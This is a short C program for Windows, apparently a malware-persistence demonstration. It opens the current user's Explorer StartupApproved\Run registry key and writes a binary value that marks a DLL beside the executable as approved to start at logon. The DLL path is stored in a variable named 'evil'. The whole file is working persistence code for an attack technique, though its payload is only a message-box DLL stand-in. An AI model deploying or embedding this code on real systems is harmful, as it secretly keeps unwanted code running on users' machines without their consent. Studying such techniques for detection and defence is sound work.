#include <windows.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[]) {
    HKEY hkey = NULL;
    BYTE data[] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

    const char* path = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run";
    char evil[MAX_PATH];
    
    // Get the path of the current executable
    if (GetModuleFileName(NULL, evil, MAX_PATH) == 0) {
        printf("Failed to get module file name.\n");
        return 1;
    }

    // Find the last backslash in the path and replace it with the DLL name
    char* last_backslash = strrchr(evil, '\\');
    if (last_backslash != NULL) {
        strcpy(last_backslash + 1, "dllmessageBox.dll");
    } else {
        printf("Failed to determine the directory of the executable.\n");
        return 1;
    }

    LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, path, 0, KEY_WRITE, &hkey);
    if (res != ERROR_SUCCESS) {
        printf("Failed to open registry key :(\n");
        return 1;
    }
    printf("Successfully opened registry key :)\n");

    res = RegSetValueEx(hkey, evil, 0, REG_BINARY, data, sizeof(data));
    if (res != ERROR_SUCCESS) {
        printf("Failed to set registry value :(\n");
        RegCloseKey(hkey);
        return 1;
    }
    printf("Successfully set registry value :)\n");

    RegCloseKey(hkey);

    return 0;
}
